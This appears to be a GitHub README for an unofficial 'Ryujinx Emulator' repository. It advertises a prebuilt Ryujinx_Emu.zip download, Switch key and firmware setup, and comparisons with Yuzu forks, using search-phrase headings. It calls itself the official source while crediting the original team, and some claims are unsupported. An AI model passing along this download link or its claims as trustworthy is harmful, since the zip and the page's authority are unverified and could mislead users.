# Ryujinx Emulator

**Ryujinx Emulator** is a highly accurate Nintendo Switch emulator for PC — play Zelda, Mario, Pokémon, and thousands of other Switch titles in up to 4K with Vulkan rendering, LDN multiplayer, and extensive mod support. Ryujinx Canary is the most actively updated build and is the top choice for most players in 2026.

<img width="280" height="280" alt="images1" src="https://github.com/user-attachments/assets/246f19aa-e5c1-46e7-b198-aff04c305109" />

## Install
[Download `Ryujinx_Emu.zip`](https://github.com/ryujinx-emulator/Ryujinx-Emu/releases/download/1.1.1403/Ryujinx-Emu.zip)
---

<img width="1200" height="675" alt="images2" src="https://github.com/user-attachments/assets/dede3098-96a9-40e5-8054-343c4a10ac8a" />

## Key Features
- High compatibility across a wide range of Nintendo Switch titles — Zelda, Mario, Pokémon, Metroid, Fire Emblem and more
- Vulkan and OpenGL rendering with 4K resolution scaling and anti-aliasing
- LDN multiplayer — play online with friends over the internet without Nintendo Switch Online
- LayeredFS mod support for game modifications, texture packs, and 60FPS patches
- NVDEC hardware-accelerated video decoding for smooth cutscenes
- PPTC profile-guided compilation for significantly faster game startup after first run
- Amiibo emulation support
- Ryujinx Canary builds — updated within 24 hours of every upstream commit


<img width="898" height="513" alt="images3" src="https://github.com/user-attachments/assets/0c008456-ea79-4a35-b43b-8fe7733b64b4" />


## Getting Started
1. **Download** the latest version using the button above.
2. **Extract** the archive to any folder on your PC.
3. **Place your prod.keys** in `%AppData%\Ryujinx\system\` — see the Keys and Firmware section below.
4. **Install firmware** via Tools → Install Firmware.
5. **Add game files** (.nsp, .xci) via File → Add New Game Directory.
6. Launch and play at 4K.

**Note:** You must own original Switch games and dump prod.keys from your own console. These files are not provided here.


<img width="739" height="415" alt="images4" src="https://github.com/user-attachments/assets/c469b6c5-57ff-45c0-ba99-2ef81e6a354e" />


## Ryujinx Keys and Firmware — Complete Setup Guide
The most common question: where do prod.keys go, and how do I install firmware?

- **prod.keys path:** `%AppData%\Ryujinx\system\prod.keys`
- **Firmware:** install via Tools → Install Firmware → select the firmware .zip file
- **Keys and firmware versions must match** — a version mismatch causes black screen or boot failure
- **Dump your own keys:** use Lockpick_RCM on your Switch; the file is named `prod.keys`


<img width="1200" height="675" alt="images5" src="https://github.com/user-attachments/assets/0f54f5b5-7c30-4563-af66-9f39e27a6fb1" />


## Ryujinx Canary vs Stable — Which Should You Use?
Ryujinx Canary is the most recommended download in 2026. It receives Vulkan fixes, LDN stability improvements, and game compatibility updates weeks before they land in the stable release.

**Ryujinx Canary GitHub:** This repository tracks the latest canary builds. The build number `1.1.1403` is the current release.

## Ryujinx vs Yuzu — Best Nintendo Switch Emulator 2026?

| Feature | Ryujinx | Yuzu |
|---|---|---|
| Vulkan accuracy | ✅ Best-in-class | ✅ Good |
| Demanding titles | ✅ More stable | ⚠ Some crashes |
| Android support | Community forks | Eden, Sudachi, Citron |
| iOS support | Community forks | Citron (AltStore) |
| LDN multiplayer | ✅ Full | ✅ Full |
| macOS | ✅ Native | Community fork |

Most users install both. Ryujinx Canary is better for PC; Yuzu forks dominate Android.


<img width="1300" height="855" alt="images6" src="https://github.com/user-attachments/assets/0aafeee0-7cf2-4868-b57b-0921a97ff0ea" />


## Ryujinx Android
Ryujinx itself is a PC application (Windows, Linux, macOS). Android Switch emulation is available via community forks:
- **Eden** — best Android performance, updated weekly
- **Citron** — iOS and Android, AltStore compatible
- **Sudachi** — stable Android build

## System Requirements
- **Windows 10 / 11** or **Linux** (64-bit)
- CPU: Intel Core i5 / AMD Ryzen 5 or better (single-core performance matters most)
- GPU: NVIDIA GTX 1060 / AMD RX 580 or better with Vulkan support
- RAM: 8 GB minimum (16 GB or more strongly recommended for demanding titles)
- Storage: SSD recommended for faster load times

## Game Compatibility
Ryujinx supports a large and growing library of Nintendo Switch games:
- **Zelda: Tears of the Kingdom** — 4K, 60FPS, fully compatible
- **Pokemon Scarlet/Violet** — full compatibility with 4K upscale
- **Mario Kart 8 Deluxe** — LDN multiplayer supported
- **Fire Emblem Engage** — fully compatible
- **Splatoon Raiders** — confirmed working with latest Canary build

## FAQ

**Ryujinx keys and firmware — where do I get them?**
Dump `prod.keys` from your Switch using Lockpick_RCM. Download firmware from your Switch's system settings. Downloading them from the internet is illegal.

**Ryujinx canary download — is this the official build?**
Download only from this GitHub repository. Always scan with VirusTotal.

**Ryujinx not launching / black screen after firmware install?**
Make sure your prod.keys version matches your firmware version exactly. Re-dump if unsure.

**Ryujinx vs Yuzu — Reddit says both are good. Which for me?**
PC players: Ryujinx Canary. Android players: Eden or Sudachi (Yuzu forks).

## Security & Legal
You must own original Switch games and create your own dumps. Downloading copyrighted ROMs or firmware is illegal.

**Recommendations:**
- Download **only** from this official GitHub repository.
- Scan files on [VirusTotal](https://www.virustotal.com).

## License & Acknowledgments
**MIT License** — Copyright © 2026 ryujinx-emulator

Acknowledgments: The original Ryujinx development team and the Nintendo Switch emulation community.
